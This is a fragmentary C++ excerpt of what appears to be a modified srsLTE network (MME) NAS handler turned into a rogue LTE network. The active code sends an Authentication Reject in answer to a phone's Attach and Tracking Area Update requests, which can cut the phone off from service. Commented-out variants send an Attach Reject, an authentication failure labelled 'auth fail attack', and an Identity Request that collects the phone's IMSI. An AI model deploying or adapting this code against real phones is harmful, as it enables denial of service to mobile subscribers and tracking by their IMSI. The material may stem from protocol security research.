                                ...
                                srslte::log*            nas_log)
{
  ...
  // attach_rej.emm_cause = 12;
  // attach_rej.esm_msg_present = false;
  // attach_rej.t3446_value_present = false;
  // srslte::byte_buffer_t* rej_msg = pool->allocate();
  // LIBLTE_ERROR_ENUM err = liblte_mme_pack_attach_reject_msg(&attach_rej, (LIBLTE_BYTE_MSG_STRUCT*)rej_msg);
  // s1ap->send_downlink_nas_transport(
  //     enb_ue_s1ap_id, s1ap->get_next_mme_ue_s1ap_id(), rej_msg, *enb_sri);
  // srslte::console("Received Initial UE message -- Attach Request -- sending reject\n");
  // if (err == LIBLTE_SUCCESS) {
  //   //nas_log->error("Error unpacking NAS attach request. Error: %s\n", liblte_error_text[err]);
  //   return true;
  // }
  ...
  srslte::byte_buffer_t* rej_msg = pool->allocate();
  LIBLTE_ERROR_ENUM err = liblte_mme_pack_authentication_reject_msg(&auth_rej, (LIBLTE_BYTE_MSG_STRUCT*)rej_msg);
  s1ap->send_downlink_nas_transport(
      enb_ue_s1ap_id, s1ap->get_next_mme_ue_s1ap_id(), rej_msg, *enb_sri);
  srslte::console("Received Initial UE message -- attach -- sending auth reject\n");
  if (err == LIBLTE_SUCCESS) {
    //nas_log->error("Error unpacking NAS attach request. Error: %s\n", liblte_error_text[err]);
    return true;
  }
  ...
  //**auth fail attack**
  // srslte::byte_buffer_t* auth_fail_msg = pool->allocate();  

  // auth_failure.emm_cause = 13;
  // auth_failure.auth_fail_param_present = false;
  // LIBLTE_ERROR_ENUM err = liblte_mme_pack_authentication_failure_msg(&auth_failure, (LIBLTE_BYTE_MSG_STRUCT*)auth_fail_msg);
  // s1ap->send_downlink_nas_transport(
  //     enb_ue_s1ap_id, s1ap->get_next_mme_ue_s1ap_id(), auth_fail_msg, *enb_sri);
  // srslte::console("Received Initial UE message -- Attach Request -- sending auth failure\n");
  // if (err == LIBLTE_SUCCESS) {
  //   //nas_log->error("Error unpacking NAS attach request. Error: %s\n", liblte_error_text[err]);
  //   return true;
  // }
  ...
  // srslte::byte_buffer_t* id_req_msg = pool->allocate();  
  // id_req.id_type        = LIBLTE_MME_EPS_MOBILE_ID_TYPE_IMSI;
  // LIBLTE_ERROR_ENUM err = liblte_mme_pack_identity_request_msg(&id_req, (LIBLTE_BYTE_MSG_STRUCT*)id_req_msg);
  // s1ap->send_downlink_nas_transport(
  //     enb_ue_s1ap_id, s1ap->get_next_mme_ue_s1ap_id(), id_req_msg, *enb_sri);
  // srslte::console("Received Initial UE message -- Attach Request -- sending id request\n");
  // if (err == LIBLTE_SUCCESS) {
  //   //nas_log->error("Error unpacking NAS attach request. Error: %s\n", liblte_error_text[err]);
  //   return true;
  // }
                                              ...
                                              srslte::log*            nas_log)
{
  ...
  s1ap->send_downlink_nas_transport(
      enb_ue_s1ap_id, s1ap->get_next_mme_ue_s1ap_id(), rej_msg, *enb_sri);
  srslte::console("Received Initial UE message -- TAU -- sending auth reject\n");
  if (err == LIBLTE_SUCCESS) {
    //nas_log->error("Error unpacking NAS attach request. Error: %s\n", liblte_error_text[err]);
    return true;
  }
